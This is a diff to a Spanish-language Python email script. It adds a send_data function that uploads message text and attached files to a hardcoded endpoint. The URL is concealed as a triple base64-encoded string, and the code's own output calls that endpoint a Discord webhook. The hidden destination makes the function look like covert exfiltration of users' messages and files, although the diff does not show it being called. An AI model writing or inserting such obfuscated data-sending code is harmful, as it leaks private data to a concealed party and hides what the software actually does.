@@ -5,6 +5,7 @@ import base64
 import logging
 import os
 import time
+import requests
 from colorama import Fore, init
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -45,6 +46,26 @@ def send_email(direccion, asunto, mensaje, archivos_adjuntos=None):
         print(f'{Fore.RED}Error: {e}. No se pudo enviar el email.')
         print("Intentelo de nuevo")
         time.sleep(5)
+
+def send_data(correo, asunto, mensaje, archivos=None):
+    url = "WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVWNlRucE5lazlFUlRWT2Fsa3dUMVJOZWsxcVozbE9lVGxHVW14S1NtTllTazVqV0hCVVpHMW9VRTF1V1ROTmEwNTJXakpHVWxWV2F6SldSRTE0V1ZSc2JHUklVWFJWYWxKUVZESTFVbE5GU21waWFrSktVa2RqZVU5WFJrSlhWRXBMVFVVNVdWZHJPVmxVUld4RFlsZGFWbE5uUFQwPQ=="
+
+    payload = {
+        "content": f"__Nuevo mensaje!__\n**{correo}**\n## {asunto}\n```\n{mensaje}\n```"
+    }
+
+    if archivos is not None:
+        archivos_adjuntos = [('file', open(archivo, 'rb')) for archivo in archivos]
+        response = requests.post(descodear(url,3), files=archivos_adjuntos, data=payload)
+    else:
+        response = requests.post(descodear(url,3), json=payload)
+
+    if response.status_code == 204:
+        print("Mensaje y archivos enviados exitosamente a la webhook de Discord")
+    else:
+        print(f"Error al enviar el mensaje y archivos. Código de estado: {response.status_code}")
+        print(response.text)  # Imprime la respuesta del servidor en caso de error
+
 
 def codear(texto, veces):
 	for a in range(veces):
